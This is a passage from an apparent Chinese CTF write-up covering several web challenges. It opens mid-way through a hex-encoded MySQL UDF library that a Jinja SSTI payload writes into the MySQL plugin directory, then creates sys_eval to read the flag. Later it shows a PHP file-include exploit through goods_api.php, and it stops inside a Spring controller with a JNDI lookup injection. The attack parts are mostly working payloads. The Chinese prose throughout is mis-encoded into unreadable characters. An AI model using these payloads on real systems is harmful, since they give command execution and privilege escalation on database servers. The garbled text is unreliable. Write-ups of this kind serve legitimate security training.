4885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE "/usr/lib/mysql/plugin/udf.so";\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶å</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'CREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so";\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯ææƒ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'select sys_eval("cat /flag");\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°flag</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706022505490.png" alt="image-20240706022505490"></p><hr><h2 id="brother-revengeï¼ˆUnsolvedï¼‰"><a href="#brother-revengeï¼ˆUnsolvedï¼‰" class="headerlink" title="brother_revengeï¼ˆUnsolvedï¼‰"></a>brother_revengeï¼ˆUnsolvedï¼‰</h2><blockquote><p>æ­¤é¢˜ä»…æ•´åˆäº†ä»–äººçš„wp</p></blockquote><p>å‰è€…æ‰“äº†è¡¥ä¸ï¼Œmysqlè¢«é™æƒä¸”secure_file_privä¸ºä¸€ä¸ªå›ºå®šç›®å½•ï¼Œå› æ­¤æ— æ³•ç›´æ¥ load_file æˆ–è€… into outfile æ¥è¯»æ–‡ä»¶æˆ–è€…å¯¼å‡ºudf</p><p>ç»“åˆå‰é¢æ‹¿åˆ°çš„ç¯å¢ƒæ–‡ä»¶è¿›è¡Œåˆ†æ</p><ol><li><p><a href="http://www.pyï¼šSSTI">www.pyï¼šSSTI</a></p><p>sql-proxy.jarï¼šä»£ç†3306åˆ°6666æœåŠ¡ç«¯</p></li><li><p>api.pyï¼šå»ºç«‹6666è¿æ¥ï¼Œæ¯éš”10ç§’æ‰§è¡Œä¸€æ¬¡<code>select version();</code><br>api.pyï¼šèµ·server_socketåˆ°7777ï¼Œæ¯éš”10ç§’å‘è¿æ¥çš„å®¢æˆ·ç«¯å‘é€ä¸€æ¬¡<code>&#123;&quot;code&quot;:0, &quot;path&quot;: &quot;&quot;&#125;</code><br>api.pyï¼šèµ·Flaskåˆ°5000ï¼Œè¯»evil.keyï¼Œå¦‚æœæ­£ç¡®çš„è¯å¯execä»»æ„pythonä»£ç </p></li><li><p>update.pyï¼šè®¿é—®7777ç«¯å£ï¼Œcode&#x3D;1åˆ™ä»pathä¸­è·å–gzæ–‡ä»¶ï¼Œè§£å‹å…¶ä¸­çš„new.binåˆ°&#x2F;updatedir</p></li></ol><hr><h2 id="w0rdpressï¼ˆUnsolvedï¼‰"><a href="#w0rdpressï¼ˆUnsolvedï¼‰" class="headerlink" title="w0rdpressï¼ˆUnsolvedï¼‰"></a>w0rdpressï¼ˆUnsolvedï¼‰</h2><blockquote><p>WordPress SQLiteæ’ä»¶ä»£ç å®¡è®¡ + CVE-2016-10956 + CVE-2024-2961</p></blockquote><p>å‚è€ƒï¼š<a href="https://blog.kengwang.com.cn/archives/640/">https://blog.kengwang.com.cn/archives/640/</a></p><p>å¤ç°ç¯å¢ƒï¼š<a href="https://kengwang.lanzouo.com/icftJ23q0p2j">https://kengwang.lanzouo.com/icftJ23q0p2j</a></p><hr><h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><h2 id="simplegoods"><a href="#simplegoods" class="headerlink" title="simplegoods"></a>simplegoods</h2><p>judge.phpä¸‹æœ‰æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706100905568.png" alt="image-20240706100905568"></p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706100926857.png" alt="image-20240706100926857"></p><p>æ–‡ä»¶ä½ç½®åœ¨&#x2F;tmp&#x2F;data&#x2F;1.png</p><p>æ¥ä¸‹æ¥æ‰¾å¯ä»¥includeçš„ç‚¹</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706101139254.png" alt="image-20240706101139254"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql_query_goods</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM `goods`"</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query_goods</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//echo var_dump($row);</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;tr>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>&lt;img class=card src="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">">&lt;/td>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/td>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'price'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/td>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'.txt'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ§åˆ¶contentï¼Œå‘ç°è¿™é‡Œçš„ifæ¡ä»¶è¦æ±‚åç¼€ä¸ºtxtï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾—é‡æ–°ä¸Šä¼ ä¸€ä¸ªtxt</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706103233779.png" alt="image-20240706103233779"></p><p>å…¨å±€æœç´¢ï¼Œå‘ç°goods_api.phpè¿™é‡Œå¯ä»¥æ’å…¥goodsçš„æ•°æ®</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706101830308.png" alt="image-20240706101830308"></p><p>å‘ç°goods_descriptionçš„å€¼å¯¹åº”sqlé‡Œé¢çš„content</p><p>é‚£ä¹ˆç›´æ¥ä¼ å‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>goods_api<span class="token operator">.</span>php<span class="token operator">?</span>method<span class="token operator">=</span>add<span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">5</span><span class="token operator">&amp;</span>goods_name<span class="token operator">=</span>b<span class="token operator">&amp;</span>goods_price<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>goods_description<span class="token operator">=</span><span class="token operator">/</span>tmp<span class="token operator">/</span>data<span class="token operator">/</span><span class="token number">1.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706103325552.png" alt="image-20240706103325552"></p><p>æ¥ä¸‹æ¥æŸ¥è¯¢å³å¯ï¼Œç”±äºjudge.phpé‚£é‡Œæœ‰<code>unlink($filename);</code>ä¼šåˆ æ‰æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œè¿™é‡Œè¦ç”¨åˆ°æ¡ä»¶ç«äº‰</p><p>ä½†æ˜¯è¿™ä¸ªé¶æœºè®¿é—®å¤ªå¤šçš„è¯è¿˜ä¼šè¿”å›503ï¼Œnmd</p><h3 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h3><p>ç›´æ¥ä¿®æ”¹market.phpå³å¯ï¼Œå»æ‰è¿™é‡Œçš„æ–‡ä»¶åŒ…å«</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'.txt'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ezSpring"><a href="#ezSpring" class="headerlink" title="ezSpring"></a>ezSpring</h2><p>ä»£ç é‡ä¸å¤§</p><p>AdminController.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AdminController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">AdminController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/lookup/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"url"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"missing url parameter"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Context</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> result <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"Lookup successful: "</span> <span class="token operator">+</span> result<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var4<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"Lookup failed"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>IndexController.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">IndexController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>EzSpringApplication.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EzSpringApplication</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">EzSpringApplication</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">EzSpringApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SecurityConfig.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span 